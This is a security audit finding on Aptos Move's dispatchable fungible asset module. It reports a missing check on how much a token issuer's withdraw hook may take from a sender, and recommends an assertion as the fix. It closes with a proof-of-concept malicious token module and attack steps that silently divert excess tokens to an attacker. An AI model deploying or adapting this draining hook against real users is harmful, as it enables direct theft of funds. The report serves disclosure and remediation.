### Title
Dispatchable Fungible Asset Withdraw Hook Can Drain More Than User-Specified Amount, Enabling Direct Theft - (`aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move`)

---

### Summary

`dispatchable_fungible_asset::withdraw` passes the caller-supplied `amount` and a full `TransferRef` to a token-issuer-controlled hook, then returns whatever `FungibleAsset` the hook produces with **no check** that the returned asset's value is ≤ `amount`. A malicious token issuer can register a hook that withdraws `amount + X` from the sender's store, redirects `X` to an attacker-controlled store, and returns only `amount` to the caller. The sender loses `amount + X` while intending to spend only `amount`. The framework's only slippage guard, `transfer_assert_minimum_deposit`, protects the **recipient** but provides zero protection for the **sender**.

---

### Finding Description

`dispatchable_fungible_asset::withdraw` is the entry point for all owner-initiated withdrawals on dispatchable tokens (AIP-73):

```move
public fun withdraw<T: key>(
    owner: &signer,
    store: Object<T>,
    amount: u64,
): FungibleAsset acquires TransferRefStore {
    fungible_asset::withdraw_sanity_check(owner, store, false);
    let func_opt = fungible_asset::withdraw_dispatch_function(store);
    if (func_opt.is_some()) {
        let func = func_opt.borrow();
        if (features::is_function_value_dispatch_enabled()) {
            dispatch_withdraw_hook(store, amount, borrow_transfer_ref(store), func)
        } else { ... }
    } else { ... }
}
``` [1](#0-0) 

The hook dispatcher:

```move
#[module_lock]
fun dispatch_withdraw_hook<T: key>(
    store: Object<T>,
    amount: u64,
    transfer_ref: &TransferRef,
    function: &FunctionInfo,
): FungibleAsset {
    let f = function.load_function_value<
        |Object<T>, u64, &TransferRef|FungibleAsset has copy + drop>();
    f(store, amount, transfer_ref)   // ← return value is never validated
}
``` [2](#0-1) 

The hook receives the **sender's store object**, the **requested amount**, and a **`TransferRef`** that bypasses frozen checks and allows arbitrary withdrawals and deposits for that asset type. `fungible_asset::withdraw_with_ref` accepts any amount up to the store's balance:

```move
public fun withdraw_with_ref<T: key>(
    self: &TransferRef, store: Object<T>, amount: u64
): FungibleAsset acquires FungibleStore, ConcurrentFungibleBalance {
    assert!(self.metadata == store_metadata(store), ...);
    unchecked_withdraw(store.object_address(), amount)
}
``` [3](#0-2) 

A malicious hook can therefore:

1. Call `transfer_ref.withdraw_with_ref(store, amount + X)` — deducting `amount + X` from the sender.
2. Call `fungible_asset::extract(&mut fa, X)` — splitting off the excess.
3. Call `transfer_ref.deposit_with_ref(attacker_store, stolen)` — crediting `X` to the attacker.
4. Return the remaining `FungibleAsset` (value = `amount`) to the framework.

The framework's `transfer` entry point then deposits this `amount`-valued asset to the recipient with no further checks:

```move
public entry fun transfer<T: key>(
    sender: &signer, from: Object<T>, to: Object<T>, amount: u64,
) acquires TransferRefStore {
    let fa = withdraw(sender, from, amount);   // hook runs here
    deposit(to, fa);                           // no sender-side check
}
``` [4](#0-3) 

The only slippage guard in the module, `transfer_assert_minimum_deposit`, checks only that the **recipient** receives at least `expected` tokens — it never checks how much was deducted from the sender:

```move
public entry fun transfer_assert_minimum_deposit<T: key>(
    sender: &signer, from: Object<T>, to: Object<T>,
    amount: u64, expected: u64
) acquires TransferRefStore {
    let start = fungible_asset::balance(to);
    let fa = withdraw(sender, from, amount);
    deposit(to, fa);
    let end = fungible_asset::balance(to);
    assert!(end - start >= expected, error::aborted(EAMOUNT_MISMATCH));
    // ← sender's balance is never checked
}
``` [5](#0-4) 

The same gap is exposed through `primary_fungible_store::transfer`, which delegates directly to `dispatchable_fungible_asset::transfer`: [6](#0-5) 

The `#[module_lock]` attribute on `dispatch_withdraw_hook` prevents reentrancy into `dispatchable_fungible_asset` itself, but does **not** prevent the hook from calling `fungible_asset::withdraw_with_ref` or `fungible_asset::deposit_with_ref`, which live in a different module. [2](#0-1) 

---

### Impact Explanation

A malicious token issuer deploys a dispatchable fungible asset with a crafted withdraw hook. Any user who calls `transfer` (or `primary_fungible_store::transfer`) on that token loses up to their full store balance minus the nominal `amount` they intended to send, with the excess silently redirected to the attacker. This constitutes **direct theft of user-controlled fungible assets** with no on-chain recourse.

---

### Likelihood Explanation

Any unprivileged account can publish a Move module, create a fungible asset, and register a malicious withdraw hook via `dispatchable_fungible_asset::register_dispatch_functions`. No governance approval or privileged capability is required beyond the `ConstructorRef` obtained at asset creation. Users interacting with novel tokens — a common DeFi pattern — are exposed. The attack is silent: the sender sees a successful transaction and the recipient receives the expected amount; only the sender's balance reveals the theft.

---

### Recommendation

After the hook returns, assert that the actual withdrawn amount does not exceed the caller-requested amount:

```move
fun dispatch_withdraw_hook<T: key>(
    store: Object<T>,
    amount: u64,
    transfer_ref: &TransferRef,
    function: &FunctionInfo,
): FungibleAsset {
    let f = function.load_function_value<
        |Object<T>, u64, &TransferRef|FungibleAsset has copy + drop>();
    let fa = f(store, amount, transfer_ref);
    assert!(
        fungible_asset::amount(&fa) <= amount,
        error::invalid_argument(EAMOUNT_MISMATCH)
    );
    fa
}
```

Alternatively, add a symmetric `transfer_assert_maximum_withdraw` entry point that snapshots the sender's balance before and after and aborts if the deduction exceeds `amount`. This mirrors the existing `transfer_assert_minimum_deposit` protection for recipients and closes the asymmetry.

### Proof of Concept

**Malicious token module (attacker-deployed):**

```move
module attacker::drain_token {
    use aptos_framework::fungible_asset::{Self, FungibleAsset, TransferRef};
    use aptos_framework::object::Object;
    use aptos_framework::primary_fungible_store;

    const ATTACKER: address = @attacker;

    public fun withdraw<T: key>(
        store: Object<T>,
        amount: u64,
        transfer_ref: &TransferRef,
    ): FungibleAsset {
        // Withdraw amount + 900 from the victim's store
        let fa = transfer_ref.withdraw_with_ref(store, amount + 900);
        // Siphon 900 to attacker
        let stolen = fungible_asset::extract(&mut fa, 900);
        let attacker_store = primary_fungible_store::ensure_primary_store_exists(
            ATTACKER,
            fungible_asset::asset_metadata(&stolen)
        );
        transfer_ref.deposit_with_ref(attacker_store, stolen);
        // Return only `amount` — framework sees a normal withdrawal
        fa
    }
}
```

**Attack sequence:**

1. Attacker creates `drain_token` with the hook above and mints tokens to victims via a marketing campaign.
2. Victim holds 1 000 `drain_token` and calls:
   ```
   primary_fungible_store::transfer(victim, drain_token_metadata, recipient, 100)
   ```
   intending to send 100 tokens.
3. The hook withdraws 1 000 tokens from the victim's store, sends 900 to the attacker, and returns 100 to the framework.
4. The framework deposits 100 to the recipient — the transaction succeeds with status `Success`.
5. Victim's balance: 0 (lost 1 000 instead of 100). Attacker's balance: +900.

The `transfer_assert_minimum_deposit` variant does not help: the recipient still receives ≥ `expected`, so the assertion passes even as the sender is drained.
